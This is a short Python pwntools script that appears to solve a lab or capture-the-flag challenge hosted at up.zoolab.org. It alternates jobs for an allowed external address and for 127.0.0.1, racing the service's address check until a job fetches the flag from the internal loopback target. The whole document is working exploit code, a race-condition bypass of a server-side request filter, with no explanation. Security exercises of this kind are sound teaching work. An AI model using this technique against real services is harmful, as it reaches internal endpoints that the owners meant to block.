#!/usr/bin/env python3
from pwn import *
import time

SAFE_JOB = b"up.zoolab.org/10000"
TARGET_JOB = b"127.0.0.1/10000"
NUM_PAIRS = 100

context.log_level = 'warning'

def add_job(p, job_str):
    p.sendlineafter(b"What do you want to do? ", b"g")
    p.sendlineafter(b"Enter flag server addr/port: ", job_str)
    p.recvuntil(b"New job added: ")
    p.recvline()

def check_flag(p):
    p.sendlineafter(b"What do you want to do? ", b"v")
    p.recvuntil(b"==== Job Status ====\n\n")
    while True:
        line = p.recvline()
        if b"FLAG{" in line:
            print("\n" + line.decode().strip())
            return True
        if b"==== Menu" in line or line.strip() == b"":
            break
    return False

def main():
    p = remote("up.zoolab.org", 10932)

    for i in range(NUM_PAIRS):
        add_job(p, SAFE_JOB)
        add_job(p, TARGET_JOB)
        if check_flag(p):
            p.sendlineafter(b"What do you want to do? ", b"q")
            p.recvuntil(b"Bye!\n")
            return
            
    p.sendlineafter(b"What do you want to do? ", b"q")
    p.recvuntil(b"Bye!\n")
    p.close()

if __name__ == "__main__":
    main()
